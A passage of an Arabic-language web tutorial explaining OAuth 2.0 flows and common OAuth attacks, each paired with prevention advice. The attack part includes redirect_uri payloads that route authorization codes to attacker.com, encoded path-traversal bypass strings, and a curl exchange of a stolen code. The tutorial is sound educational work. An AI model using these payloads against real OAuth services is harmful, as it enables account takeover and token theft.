                        <li><strong>المثال:</strong> Gmail API، Facebook Graph API، GitHub API</li>
                        <li><strong>الوظيفة:</strong> يقدم البيانات للتطبيقات المصرح لها</li>
                        <li><strong>الحماية:</strong> يتحقق من صحة Access Token</li>
                        <li><strong>الاستجابة:</strong> يرد بالبيانات أو خطأ 401/403</li>
                    </ul>
                </div>
            </div>

            <h3><i class="fas fa-route"></i> تدفقات OAuth 2.0 (Grant Types)</h3>
            
            <p>هناك عدة طرق للحصول على Access Token، كل طريقة مناسبة لنوع معين من التطبيقات:</p>

            <div class="attack-demo">
                <h4>🔄 1. Authorization Code Flow - الأكثر أماناً</h4>
                <p><strong>الاستخدام:</strong> Web applications مع backend server</p>
                <p><strong>المميزة:</strong> الأكثر أماناً لأن client_secret محمي في الخادم</p>
                
                <div class="mermaid">
sequenceDiagram
    participant U as 👤 المستخدم
    participant C as 📱 Client App
    participant AS as 🔐 Auth Server
    participant RS as 📊 Resource Server
    
    U->>C: 1. يريد تسجيل دخول بـ Google
    C->>U: 2. redirect لـ Google OAuth
    Note over C,U: https://accounts.google.com/oauth/authorize?<br/>client_id=123&redirect_uri=app.com/callback<br/>&response_type=code&scope=profile
    
    U->>AS: 3. يسجل دخول ويوافق على الصلاحيات
    AS->>U: 4. redirect مع authorization code
    Note over AS,U: https://app.com/callback?code=ABC123
    
    U->>C: 5. يصل للـ callback مع code
    C->>AS: 6. يبادل code بـ access_token
    Note over C,AS: POST /token<br/>code=ABC123&client_id=123<br/>&client_secret=secret&grant_type=authorization_code
    
    AS->>C: 7. يرد بـ access_token
    Note over AS,C: {"access_token": "xyz789", "token_type": "Bearer"}
    
    C->>RS: 8. يطلب بيانات المستخدم
    Note over C,RS: GET /userinfo<br/>Authorization: Bearer xyz789
    
    RS->>C: 9. يرد ببيانات المستخدم
    C->>U: 10. يعرض البيانات للمستخدم
                </div>
                
                <div class="code-block">
# خطوات Authorization Code Flow:

1. التوجيه للتفويض:
GET https://accounts.google.com/oauth/authorize?
  client_id=123456789&
  redirect_uri=https://myapp.com/callback&
  response_type=code&
  scope=profile email&
  state=random_string_for_security

2. المستخدم يوافق ويتم التوجيه:
GET https://myapp.com/callback?
  code=4/0AX4XfWjcXXXXXXXXXXXXX&
  state=random_string_for_security

3. مبادلة Code بـ Access Token:
POST https://oauth2.googleapis.com/token
Content-Type: application/x-www-form-urlencoded

client_id=123456789&
client_secret=your_secret&
code=4/0AX4XfWjcXXXXXXXXXXXXX&
grant_type=authorization_code&
redirect_uri=https://myapp.com/callback

4. الاستجابة:
{
  "access_token": "ya29.a0ARrdaM9...",
  "expires_in": 3600,
  "refresh_token": "1//04xxx...",
  "scope": "profile email",
  "token_type": "Bearer"
}

5. استخدام Access Token:
GET https://www.googleapis.com/oauth2/v2/userinfo
Authorization: Bearer ya29.a0ARrdaM9...
                </div>
            </div>

            <div class="attack-demo">
                <h4>🔐 2. Authorization Code Flow + PKCE</h4>
                <p><strong>PKCE:</strong> Proof Key for Code Exchange</p>
                <p><strong>الاستخدام:</strong> Mobile apps وSPA (Single Page Applications)</p>
                <p><strong>المشكلة التي يحل:</strong> حماية authorization code من الاعتراض</p>
                
                <div class="mermaid">
sequenceDiagram
    participant M as 📱 Mobile App
    participant AS as 🔐 Auth Server
    
    M->>M: 1. إنشاء code_verifier عشوائي
    Note over M: code_verifier = base64url(random(32))
    
    M->>M: 2. حساب code_challenge
    Note over M: code_challenge = base64url(SHA256(code_verifier))
    
    M->>AS: 3. طلب authorization مع PKCE
    Note over M,AS: /authorize?client_id=123&<br/>code_challenge=xyz&<br/>code_challenge_method=S256
    
    AS->>M: 4. إرجاع authorization code
    
    M->>AS: 5. مبادلة code + code_verifier
    Note over M,AS: POST /token<br/>code=ABC&code_verifier=original_value
    
    AS->>AS: 6. التحقق من PKCE
    Note over AS: SHA256(code_verifier) == code_challenge?
    
    AS->>M: 7. إصدار access_token إذا صحيح
                </div>
                
                <div class="code-block">
# PKCE Implementation:

1. إنشاء code_verifier (43-128 حرف):
const code_verifier = base64url(crypto.randomBytes(32));
// مثال: "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"

2. حساب code_challenge:
const code_challenge = base64url(crypto.createHash('sha256').update(code_verifier).digest());
// مثال: "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"

3. Authorization Request:
GET /authorize?
  client_id=123&
  redirect_uri=com.myapp://callback&
  response_type=code&
  code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&
  code_challenge_method=S256

4. Token Exchange:
POST /token
{
  "grant_type": "authorization_code",
  "client_id": "123",
  "code": "received_code",
  "redirect_uri": "com.myapp://callback",
  "code_verifier": "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
}

# لماذا PKCE آمن؟
- المهاجم يمكنه اعتراض authorization code
- لكن لا يمكنه معرفة code_verifier الأصلي
- بدون code_verifier، لا يمكن الحصول على access_token
                </div>
            </div>

            <div class="attack-demo">
                <h4>⚡ 3. Implicit Flow - مهجور وخطير</h4>
                <p><strong>الاستخدام:</strong> كان يُستخدم لـ JavaScript apps</p>
                <p><strong>المشكلة:</strong> access_token يظهر في URL ويمكن اعتراضه بسهولة</p>
                
                <div class="danger">
                    <h4>⚠️ لماذا Implicit Flow خطير؟</h4>
                    <ul class="list">
                        <li><strong>Token في URL:</strong> access_token يظهر في fragment (#)</li>
                        <li><strong>Browser History:</strong> يحفظ في تاريخ المتصفح</li>
                        <li><strong>Referrer Leakage:</strong> قد يتسرب للمواقع الأخرى</li>
                        <li><strong>No Refresh Token:</strong> لا يوجد refresh token</li>
                    </ul>
                </div>
                
                <div class="code-block">
# Implicit Flow (لا تستخدمه!):

1. Authorization Request:
GET /authorize?
  client_id=123&
  redirect_uri=https://app.com/callback&
  response_type=token&  ← مباشرة token وليس code
  scope=profile

2. الاستجابة الخطيرة:
https://app.com/callback#
  access_token=ya29.a0ARrdaM9...&  ← Token مكشوف!
  token_type=Bearer&
  expires_in=3600

# المشاكل:
❌ Token في URL bar
❌ Token في browser history  
❌ Token في server logs
❌ Token قد يتسرب للـ referrer
❌ لا يوجد client authentication

# البديل الآمن:
✅ استخدم Authorization Code + PKCE
                </div>
            </div>

            <div class="attack-demo">
                <h4>🔧 4. Client Credentials Flow</h4>
                <p><strong>الاستخدام:</strong> Server-to-server communication</p>
                <p><strong>المميزة:</strong> لا يوجد مستخدم، التطبيق يصل لبياناته الخاصة</p>
                
                <div class="mermaid">
sequenceDiagram
    participant C as 🖥️ Client Server
    participant AS as 🔐 Auth Server
    participant RS as 📊 Resource Server
    
    C->>AS: 1. طلب access_token
    Note over C,AS: POST /token<br/>grant_type=client_credentials<br/>client_id=123&client_secret=secret
    
    AS->>AS: 2. التحقق من client credentials
    AS->>C: 3. إصدار access_token
    Note over AS,C: {"access_token": "xyz789", "token_type": "Bearer"}
    
    C->>RS: 4. استخدام token للوصول للـ API
    Note over C,RS: GET /api/data<br/>Authorization: Bearer xyz789
    
    RS->>C: 5. إرجاع البيانات
                </div>
                
                <div class="code-block">
# Client Credentials Flow:

POST /token HTTP/1.1
Host: oauth.provider.com
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials&
client_id=your_client_id&
client_secret=your_client_secret&
scope=api:read api:write

# Response:
{
  "access_token": "2YotnFZFEjr1zCsicMWpAA",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "api:read api:write"
}

# الاستخدام:
curl -H "Authorization: Bearer 2YotnFZFEjr1zCsicMWpAA" \
     https://api.provider.com/data

# متى تستخدمه:
✅ Microservices communication
✅ Scheduled jobs/cron tasks  
✅ Backend API integration
✅ Machine-to-machine authentication

# متى لا تستخدمه:
❌ عندما تحتاج بيانات مستخدم محدد
❌ Frontend applications
❌ Mobile applications
                </div>
            </div>

            <h3><i class="fas fa-cogs"></i> مفاهيم مهمة في OAuth 2.0</h3>
            
            <div class="grid">
                <div class="card">
                    <h4>🔍 Scopes (النطاقات)</h4>
                    <p>تحدد ما يمكن للتطبيق الوصول إليه</p>
                    <div class="code-block">
# أمثلة Scopes:
profile          → الاسم والصورة الشخصية
email           → عنوان البريد الإلكتروني  
openid          → للـ OpenID Connect
read:user       → قراءة معلومات المستخدم
write:repo      → كتابة في المستودعات (GitHub)
photos.readonly → قراءة الصور فقط (Google Photos)

# في الطلب:
scope=profile email photos.readonly
                    </div>
                </div>
                
                <div class="card">
                    <h4>🔄 Refresh Tokens</h4>
                    <p>للحصول على access tokens جديدة</p>
                    <div class="code-block">
# لماذا Refresh Tokens؟
- Access tokens قصيرة المدى (15 دقيقة - ساعة)
- Refresh tokens طويلة المدى (أسابيع - شهور)
- إذا تسرب access token، ضرره محدود

# استخدام Refresh Token:
POST /token
{
  "grant_type": "refresh_token",
  "refresh_token": "your_refresh_token",
  "client_id": "your_client_id",
  "client_secret": "your_secret"
}

# الاستجابة:
{
  "access_token": "new_access_token",
  "refresh_token": "new_refresh_token",
  "expires_in": 3600
}
                    </div>
                </div>
                
                <div class="card">
                    <h4>🌐 redirect_uri</h4>
                    <p>إلى أين يتم توجيه المستخدم بعد التفويض</p>
                    <div class="code-block">
# أمثلة redirect_uri:

Web App:
https://myapp.com/oauth/callback

Mobile App:
com.myapp://oauth/callback

Localhost (للتطوير):
http://localhost:8080/callback

# قواعد مهمة:
✅ يجب تسجيلها مسبقاً مع OAuth provider
✅ يجب أن تكون HTTPS (عدا localhost)
✅ يجب التطابق التام (exact match)
❌ لا تستخدم wildcards أو regex
                    </div>
                </div>
                
                <div class="card">
                    <h4>🔐 State Parameter</h4>
                    <p>لمنع CSRF attacks</p>
                    <div class="code-block">
# كيف يعمل State:

1. إنشاء state عشوائي:
const state = crypto.randomBytes(16).toString('hex');
// حفظه في session أو localStorage

2. إرساله مع طلب التفويض:
/authorize?client_id=123&state=abc123xyz...

3. التحقق عند العودة:
if (received_state !== stored_state) {
  throw new Error('CSRF attack detected!');
}

# لماذا مهم؟
- يمنع CSRF attacks
- يضمن أن الاستجابة لطلبك أنت
- يحمي من session hijacking
                    </div>
                </div>
            </div>
        </section>

        <section id="oauth-attacks">
            <h2><i class="fas fa-bug"></i> هجمات OAuth الشائعة - دليل شامل للمبتدئين</h2>
            
            <p>OAuth 2.0 رغم قوته، إلا أنه معرض لعدة هجمات خطيرة إذا لم يُطبق بشكل صحيح. سنستكشف أهم الهجمات مع أمثلة عملية وكيفية استغلالها! 🎯</p>

            <div class="danger">
                <h4><i class="fas fa-exclamation-triangle"></i> تحذير مهم</h4>
                <p>معظم هجمات OAuth تحدث بسبب <strong>سوء التطبيق</strong> وليس ضعف في البروتوكول نفسه. الشيطان في التفاصيل!</p>
            </div>

            <div class="attack-demo">
                <h3><i class="fas fa-link"></i> 1. هجمات redirect_uri - الأكثر شيوعاً</h3>
                <p>هذا النوع من الهجمات يستغل ضعف التحقق من redirect_uri لسرقة authorization codes أو access tokens.</p>

                <h4>🚨 1.1 Open Redirect Attack</h4>
                <p><strong>المشكلة:</strong> الخادم لا يتحقق بدقة من redirect_uri المرسل</p>
                
                <div class="mermaid">
sequenceDiagram
    participant A as 🥷 المهاجم
    participant V as 👤 الضحية  
    participant AS as 🔐 Auth Server
    participant M as 🌐 موقع المهاجم
    
    A->>V: 1. إرسال رابط مشبوه
    Note over A,V: https://victim-app.com/oauth/login?<br/>redirect_uri=https://attacker.com/steal
    
    V->>AS: 2. تسجيل دخول وموافقة
    AS->>M: 3. إعادة توجيه مع authorization code
    Note over AS,M: https://attacker.com/steal?code=ABC123
    
    M->>A: 4. المهاجم يحصل على code
    A->>AS: 5. يبادل code بـ access_token
    A->>A: 6. يسيطر على حساب الضحية! 🔥
                </div>

                <div class="code-block">
{
  "attack_type": "Open Redirect Attack",
  "steps": [
    {
      "step": 1,
      "title": "الطلب العادي (آمن)",
      "request": {
        "method": "GET",
        "url": "/oauth/authorize",
        "parameters": {
          "client_id": "123",
          "redirect_uri": "https://victim-app.com/callback",
          "response_type": "code",
          "scope": "profile"
        },
        "status": "✅ آمن"
      }
    },
    {
      "step": 2,
      "title": "الطلب المشبوه (خطير)",
      "request": {
        "method": "GET",
        "url": "/oauth/authorize",
        "parameters": {
          "client_id": "123",
          "redirect_uri": "https://attacker.com/steal",
          "response_type": "code",
          "scope": "profile"
        },
        "status": "❌ خطير - المهاجم يغير redirect_uri!"
      }
    },
    {
      "step": 3,
      "title": "إعادة التوجيه للمهاجم",
      "redirect_url": "https://attacker.com/steal?code=4/0AX4XfWjXXXXXXXXX",
      "result": "authorization code يذهب للمهاجم"
    },
    {
      "step": 4,
      "title": "المهاجم يبادل الكود",
      "request": {
        "method": "POST",
        "url": "https://oauth2.googleapis.com/token",
        "headers": {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        "body": {
          "client_id": "123",
          "client_secret": "secret",
          "code": "4/0AX4XfWjXXXXXXXXX",
          "grant_type": "authorization_code",
          "redirect_uri": "https://attacker.com/steal"
        }
      },
      "response": {
        "access_token": "ya29.a0ARrdaM9...",
        "token_type": "Bearer",
        "expires_in": 3600
      },
      "result": "💀 المهاجم حصل على access_token!"
    }
  ]
}
                </div>

                <h4>🔗 1.2 Subdomain Takeover Attack</h4>
                <p><strong>السيناريو:</strong> redirect_uri يسمح بـ subdomains، والمهاجم يسيطر على subdomain مهجور</p>
                
                <div class="code-block">
{
  "attack_type": "Subdomain Takeover Attack",
  "vulnerability": {
    "description": "التطبيق يسمح بـ wildcard subdomains",
    "allowed_pattern": "https://*.victim-app.com/callback"
  },
  "steps": [
    {
      "step": 1,
      "title": "اكتشاف subdomain مهجور",
      "target_subdomain": "old-api.victim-app.com",
      "status": "غير مستخدم/مهجور"
    },
    {
      "step": 2,
      "title": "السيطرة على الـ subdomain",
      "methods": [
        "DNS takeover (إذا كان يشير لخدمة ملغاة)",
        "GitHub Pages takeover",
        "AWS S3 bucket takeover",
        "Heroku app takeover"
      ]
    },
    {
      "step": 3,
      "title": "إنشاء صفحة callback مزيفة",
      "malicious_url": "https://old-api.victim-app.com/callback",
      "purpose": "استقبال authorization codes"
    },
    {
      "step": 4,
      "title": "إرسال رابط مشبوه للضحية",
      "phishing_url": {
        "base": "https://auth.provider.com/oauth/authorize",
        "parameters": {
          "client_id": "123",
          "redirect_uri": "https://old-api.victim-app.com/callback",
          "response_type": "code",
          "scope": "profile email"
        }
      }
    },
    {
      "step": 5,
      "title": "النتيجة",
      "result": "🎯 authorization code يذهب للمهاجم!",
      "impact": "السيطرة الكاملة على حساب الضحية"
    }
  ],
  "prevention": [
    "استخدم exact match للـ redirect_uri",
    "لا تستخدم wildcards",
    "راقب subdomains المهجورة",
    "استخدم subdomain monitoring tools"
  ]
}
                </div>

                <h4>🎭 1.3 Path Traversal في redirect_uri</h4>
                <div class="code-block">
{
  "attack_type": "Path Traversal في redirect_uri",
  "techniques": [
    {
      "method": "Directory Traversal",
      "payload": "https://victim-app.com/callback/../../../attacker.com/steal",
      "result": "https://attacker.com/steal",
      "description": "استخدام ../ للخروج من المسار المسموح"
    },
    {
      "method": "URL Encoding",
      "payload": "https://victim-app.com/callback%2F..%2F..%2Fattacker.com",
      "encoded_chars": {
        "%2F": "/",
        "%2E": "."
      },
      "description": "تشفير الأحرف لتجاوز الفلاتر"
    },
    {
      "method": "Unicode Encoding",
      "payload": "https://victim-app.com/callback/\\u002e\\u002e/attacker.com",
      "unicode_chars": {
        "\\u002e": ".",
        "\\u002f": "/"
      },
      "description": "استخدام Unicode لإخفاء الـ payload"
    },
    {
      "method": "Double Encoding",
      "payload": "https://victim-app.com/callback%252F%252E%252E%252Fattacker.com",
      "description": "تشفير مزدوج لتجاوز فلاتر متقدمة"
    }
  ],
  "prevention": [
    "تطبيق exact string matching",
    "منع أي أحرف خاصة في redirect_uri",
    "استخدام whitelist صارمة",
    "تجنب URL parsing/normalization"
  ]
}
                </div>
            </div>

            <div class="attack-demo">
                <h3><i class="fas fa-eye-slash"></i> 2. هجمات تسريب Token</h3>

                <h4>📊 2.1 Referer Header Leakage</h4>
                <p><strong>المشكلة:</strong> access_token يتسرب عبر HTTP Referer header</p>
                
                <div class="mermaid">
sequenceDiagram
    participant U as 👤 المستخدم
    participant A as 🌐 التطبيق
    participant E as 🌍 موقع خارجي
    participant M as 🥷 المهاجم
    
    U->>A: 1. OAuth login ناجح
    A->>U: 2. redirect مع token في URL
    Note over A,U: https://app.com/dashboard#access_token=xyz789
    
    U->>U: 3. ينقر على رابط خارجي في الصفحة
    U->>E: 4. الانتقال للموقع الخارجي
    Note over U,E: Referer: https://app.com/dashboard#access_token=xyz789
    
    E->>M: 5. الموقع الخارجي يرسل Referer للمهاجم
    M->>M: 6. المهاجم يستخرج token من Referer! 💀
                </div>

                <div class="code-block">
{
  "attack_type": "Referer Header Leakage",
  "scenario": {
    "flow_type": "Implicit Flow",
    "vulnerability": "access_token في URL fragment"
  },
  "steps": [
    {
      "step": 1,
      "title": "تسجيل دخول OAuth ناجح",
      "url_with_token": "https://app.com/dashboard#access_token=ya29.a0ARrdaM9...",
      "issue": "Token مرئي في URL"
    },
    {
      "step": 2,
      "title": "وجود رابط خارجي في الصفحة",
      "html": "<a href=\"https://external-site.com/news\">اقرأ الأخبار</a>",
      "risk": "عدم استخدام rel=\"noreferrer\""
    },
    {
      "step": 3,
      "title": "النقر على الرابط الخارجي",
      "http_request": {
        "method": "GET",
        "url": "https://external-site.com/news",
        "headers": {
          "Referer": "https://app.com/dashboard#access_token=ya29.a0ARrdaM9..."
        }
      },
      "leaked_data": "access_token كامل"
    },
    {
      "step": 4,
      "title": "الموقع الخارجي يسجل Referer",
      "server_log": "[INFO] Referer: https://app.com/dashboard#access_token=ya29.a0ARrdaM9...",
      "result": "🔥 Token مكشوف في server logs!"
    }
  ],
  "solutions": [
    {
      "method": "rel=\"noreferrer\"",
      "implementation": "<a href=\"https://external-site.com/news\" rel=\"noreferrer\">اقرأ الأخبار</a>",
      "effect": "منع إرسال Referer header"
    },
    {
      "method": "استخدام Authorization Code Flow",
      "benefit": "Token لا يظهر في URL",
      "recommended": true
    },
    {
      "method": "Referrer Policy",
      "implementation": "<meta name=\"referrer\" content=\"no-referrer\">",
      "scope": "site-wide protection"
    }
  ]
}
                </div>

                <h4>📝 2.2 Server Logs Exposure</h4>
                <div class="code-block">
{
  "attack_type": "Server Logs Exposure",
  "root_cause": "وضع tokens في URL parameters",
  "attack_flow": [
    {
      "step": 1,
      "title": "Implicit Flow ينتج token في URL",
      "url": "https://app.com/callback#access_token=xyz789&token_type=Bearer",
      "issue": "Token في URL fragment"
    },
    {
      "step": 2,
      "title": "JavaScript redirect خاطئ",
      "code": "window.location = \"https://app.com/dashboard?token=\" + access_token;",
      "problem": "نقل token من fragment إلى query parameter"
    },
    {
      "step": 3,
      "title": "Token يظهر في server logs",
      "log_entry": "[INFO] GET /dashboard?token=xyz789 HTTP/1.1",
      "exposure": "Token مكشوف في access logs"
    },
    {
      "step": 4,
      "title": "تسريب واسع النطاق",
      "risks": [
        "أي admin يصل للـ logs يحصل على tokens",
        "Log aggregation systems تحفظ tokens",
        "Backup systems تحتوي على tokens",
        "Log analysis tools تعرض tokens"
      ],
      "result": "😱 تسريب جماعي للـ access tokens!"
    }
  ],
  "solutions": {
    "immediate": [
      {
        "method": "تجنب GET parameters للـ tokens",
        "implementation": "استخدم POST requests أو headers",
        "priority": "عالي"
      },
      {
        "method": "استخدام Authorization Code Flow",
        "benefit": "Token لا يظهر في URL أبداً",
        "recommended": true
      }
    ],
    "best_practices": [
      {
        "practice": "sessionStorage بدل localStorage",
        "reason": "ينتهي مع إغلاق المتصفح"
      },
      {
        "practice": "httpOnly cookies للـ refresh tokens",
        "reason": "غير قابل للوصول من JavaScript"
      },
      {
        "practice": "Log sanitization",
        "implementation": "فلترة tokens من logs تلقائياً"
      }
    ]
  }
}
                </div>
            </div>

            <div class="attack-demo">
                <h3><i class="fas fa-shield-alt"></i> 3. هجمات PKCE وإعادة الاستخدام</h3>

                <h4>🔄 3.1 Authorization Code Reuse</h4>
                <p><strong>المشكلة:</strong> authorization code يمكن استخدامه أكثر من مرة</p>
                
                <div class="code-block">
{
  "attack_type": "Authorization Code Reuse Attack",
  "vulnerability": "إمكانية استخدام authorization code أكثر من مرة",
  "attack_timeline": [
    {
      "step": 1,
      "actor": "🥷 المهاجم",
      "action": "اعتراض authorization code",
      "intercepted_url": "https://app.com/callback?code=4/0AX4XfWjXXXXXX",
      "method": "Network interception أو Man-in-the-middle",
      "timing": "قبل وصول code للتطبيق الأصلي"
    },
    {
      "step": 2,
      "actor": "🥷 المهاجم",
      "action": "استخدام code المسروق",
      "request": {
        "method": "POST",
        "url": "https://oauth2.googleapis.com/token",
        "headers": {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        "body": {
          "client_id": "123",
          "client_secret": "secret",
          "code": "4/0AX4XfWjXXXXXX",
          "grant_type": "authorization_code"
        }
      },
      "curl_example": [
        "curl -X POST https://oauth2.googleapis.com/token \\",
        "  -H 'Content-Type: application/x-www-form-urlencoded' \\",
        "  -d 'client_id=123' \\",
        "  -d 'client_secret=secret' \\",
        "  -d 'code=4/0AX4XfWjXXXXXX' \\",
        "  -d 'grant_type=authorization_code'"
      ]
    },
    {
      "step": 3,
      "actor": "🔐 OAuth Server",
      "action": "إصدار access_token للمهاجم",
      "response": {
        "access_token": "ya29.a0ARrdaM9...",
        "token_type": "Bearer",
        "expires_in": 3600,
        "scope": "profile email"
      },
      "result": "✅ المهاجم حصل على access_token صالح!"
    },
    {
      "step": 4,
      "actor": "📱 التطبيق الأصلي",
      "action": "محاولة استخدام نفس code",
      "request_status": "❌ فشل",
      "error_response": {
        "error": "invalid_grant",
        "error_description": "Authorization code has already been used"
      },
      "user_experience": "خطأ في تسجيل الدخول"
    },
    {
      "step": 5,
      "actor": "👤 المستخدم",
      "action": "إعادة المحاولة",
      "result": "إنشاء authorization code جديد",
      "vulnerability": "🔄 المهاجم يمكنه اعتراض code جديد مرة أخرى"
    }
  ],
  "impact": {
    "severity": "عالي",
    "consequences": [
      "سيطرة المهاجم على حساب المستخدم",
      "وصول غير مصرح به للبيانات الحساسة",
      "إمكانية تنفيذ عمليات باسم المستخدم",
      "تجربة مستخدم سيئة (أخطاء متكررة)"
    ]
  },
  "prevention_measures": {
    "server_side": [
      {
        "measure": "One-time use enforcement",
        "description": "authorization code يُستخدم مرة واحدة فقط",
        "implementation": "حذف code فوراً بعد الاستخدام الأول"
      },
      {
        "measure": "Short expiration time",
        "description": "انتهاء صلاحية سريع",
        "recommended_duration": "5-10 دقائق",
        "benefit": "تقليل نافذة الهجوم"
      },
      {
        "measure": "Client binding",
        "description": "ربط code بـ client_id محدد",
        "validation": "التحقق من client_id عند استخدام code"
      },
      {
        "measure": "Rate limiting",
        "description": "تحديد عدد المحاولات",
        "implementation": "منع المحاولات المتكررة من نفس IP"
      }
    ],
    "detection": [
      {
        "method": "Monitoring duplicate usage",
        "alert": "تنبيه عند محاولة استخدام code مرتين"
      },
      {
        "method": "Anomaly detection",
        "indicators": [
          "محاولات سريعة متتالية",
          "استخدام codes من IPs مختلفة",
          "patterns غير طبيعية في التوقيت"
        ]
      }
    ]
  },
  "secure_implementation": {
    "code_storage": {
      "database_design": "جدول منفصل للـ authorization codes",
      "fields": [
        "code_hash (hashed value)",
        "client_id",
        "user_id", 
        "expires_at",
        "used_at (null initially)",
        "created_at"
      ]
    },
    "validation_logic": [
      "if (code.used_at !== null) throw 'Code already used'",
      "if (code.expires_at < now()) throw 'Code expired'", 
      "if (code.client_id !== request.client_id) throw 'Invalid client'",
      "// Mark as used immediately",
      "code.used_at = now()",
      "code.save()"
    ]
  }
}
                </div>

                <h4>🔐 3.2 Weak PKCE Implementation</h4>
                <div class="code-block">
{
  "attack_type": "Weak PKCE Implementation",
  "vulnerability_categories": [
    {
      "issue": "Weak code_verifier",
      "description": "استخدام قيم ضعيفة أو متوقعة للـ code_verifier",
      "examples": {
        "bad_practice": {
          "code": "code_verifier = \"12345\"",
          "risk": "❌ سهل التخمين - يمكن brute force",
          "entropy": "منخفض جداً"
        },
        "good_practice": {
          "code": "code_verifier = crypto.randomBytes(32).toString('base64url')",
          "benefit": "✅ قوي - عشوائي مع entropy عالي",
          "entropy": "256 bits"
        }
      }
    },
    {
      "issue": "Insecure challenge method",
      "description": "استخدام plain text بدلاً من hashing",
      "comparison": {
        "insecure": {
          "method": "plain",
          "code": "code_challenge_method=plain",
          "vulnerability": "❌ code_verifier مكشوف في الطلب",
          "attack_vector": "يمكن اعتراض code_verifier من network traffic"
        },
        "secure": {
          "method": "S256",
          "code": "code_challenge_method=S256",
          "protection": "✅ آمن - يستخدم SHA256 hashing",
          "benefit": "code_verifier محمي حتى لو تم اعتراض الطلب"
        }
      }
    },
    {
      "issue": "Missing server-side verification",
      "description": "عدم التحقق من code_verifier في الخادم",
      "secure_implementation": {
        "validation_steps": [
          "استقبال code_verifier من العميل",
          "حساب SHA256 hash للـ code_verifier",
          "مقارنة النتيجة مع stored code_challenge",
          "رفض الطلب إذا لم تتطابق"
        ],
        "code_example": [
          "// Server-side verification",
          "const receivedHash = crypto.createHash('sha256')",
          "  .update(received_code_verifier)",
          "  .digest('base64url');",
          "",
          "if (receivedHash !== stored_code_challenge) {",
          "  throw new Error('Invalid PKCE verification');",
          "}"
        ]
      }
    },
    {
      "issue": "Code verifier reuse",
      "description": "إعادة استخدام نفس code_verifier",
      "problems": [
        "replay attacks ممكنة",
        "تقليل الأمان العام",
        "انتهاك PKCE specification"
      ],
      "solution": {
        "principle": "إنشاء code_verifier جديد لكل OAuth flow",
        "implementation": [
          "// Generate new verifier for each request",
          "const code_verifier = crypto.randomBytes(32).toString('base64url');",
          "const code_challenge = crypto.createHash('sha256')",
          "  .update(code_verifier)",
          "  .digest('base64url');"
        ]
      }
    }
  ],
  "attack_scenarios": [
    {
      "scenario": "Weak verifier brute force",
      "steps": [
        "المهاجم يعترض authorization request",
        "يستخرج code_challenge",
        "يجرب قيم code_verifier شائعة",
        "ينجح في العثور على المطابق",
        "يستخدمه لسرقة authorization code"
      ]
    },
    {
      "scenario": "Plain method interception",
      "steps": [
        "المهاجم يعترض PKCE request مع plain method",
        "يحصل على code_verifier مباشرة",
        "يستخدمه لاحقاً مع authorization code المسروق"
      ]
    }
  ],
  "prevention": {
    "client_side": [
      "استخدم crypto-secure random generator",
      "code_verifier بطول 43-128 حرف",
      "استخدم S256 method دائماً",
      "لا تخزن code_verifier في مكان غير آمن"
    ],
    "server_side": [
      "تحقق من code_challenge_method",
      "ارفض plain method في production",
      "تحقق من code_verifier hash بدقة",
      "سجل محاولات PKCE الفاشلة"
    ]
  }
}
                </div>
            </div>

            <div class="attack-demo">
                <h3><i class="fas fa-random"></i> 4. State Parameter Attacks</h3>

                <h4>🎯 4.1 CSRF Attack بدون State</h4>
                <p><strong>السيناريو:</strong> المهاجم يربط حسابه بحساب الضحية</p>
                
                <div class="mermaid">
sequenceDiagram
    participant A as 🥷 المهاجم
    participant V as 👤 الضحية
    participant AS as 🔐 Auth Server
    participant T as 🌐 Target App
    
    A->>AS: 1. يبدأ OAuth flow لحسابه
    AS->>A: 2. يحصل على authorization code
    Note over AS,A: https://target-app.com/callback?code=ATTACKER_CODE
    
    A->>V: 3. يرسل الرابط للضحية (بدون state)
    Note over A,V: https://target-app.com/callback?code=ATTACKER_CODE
    
    V->>T: 4. الضحية تنقر على الرابط
    T->>AS: 5. يبادل code بـ access_token
    T->>T: 6. يربط حساب المهاجم بجلسة الضحية!
    
    A->>T: 7. المهاجم يصل لحساب الضحية! 🔥
                </div>

                <div class="code-block">
{
  "attack_type": "OAuth CSRF Attack",
  "vulnerability": "عدم وجود state parameter",
  "objective": "ربط حساب المهاجم بجلسة الضحية",
  "attack_scenario": [
    {
      "step": 1,
      "actor": "المهاجم",
      "action": "بدء OAuth flow",
      "request": {
        "url": "https://accounts.google.com/oauth/authorize",
        "parameters": {
          "client_id": "123",
          "redirect_uri": "https://victim-app.com/callback",
          "response_type": "code",
          "scope": "profile"
        },
        "missing": "state parameter ⚠️"
      }
    },
    {
      "step": 2,
      "actor": "المهاجم",
      "action": "الحصول على authorization code",
      "callback_url": "https://victim-app.com/callback?code=ATTACKER_CODE",
      "note": "المهاجم لا يستكمل العملية"
    },
    {
      "step": 3,
      "actor": "المهاجم",
      "action": "إرسال رابط للضحية",
      "social_engineering": {
        "message": "انقر هنا للحصول على عرض خاص!",
        "malicious_url": "https://victim-app.com/callback?code=ATTACKER_CODE",
        "delivery_method": ["email", "SMS", "social media"]
      }
    },
    {
      "step": 4,
      "actor": "الضحية",
      "action": "النقر على الرابط",
      "result": "التطبيق يربط حساب Google للمهاجم بجلسة الضحية"
    },
    {
      "step": 5,
      "actor": "المهاجم",
      "action": "تسجيل دخول بحساب Google",
      "result": "💀 الوصول لحساب الضحية!",
      "impact": "Account takeover كامل"
    }
  ],
  "prevention": {
    "state_parameter": {
      "implementation": {
        "generate": "const state = crypto.randomBytes(16).toString('hex');",
        "store": "sessionStorage.setItem('oauth_state', state);",
        "verify": "if (received_state !== stored_state) { throw new Error('CSRF attack detected!'); }"
      },
      "properties": [
        "عشوائي وفريد لكل طلب",
        "مرتبط بجلسة المستخدم",
        "يتم التحقق منه عند العودة"
      ]
    },
    "additional_measures": [
      "ربط OAuth flow بـ user session",
      "تسجيل ومراقبة OAuth activities",
      "تحديد مهلة زمنية للـ authorization codes"
    ]
  }
}
                </div>
            </div>

            <div class="attack-demo">
                <h3><i class="fas fa-link"></i> 5. Account Linking Attacks</h3>

                <h4>🔗 5.1 Account Takeover via OAuth Linking</h4>
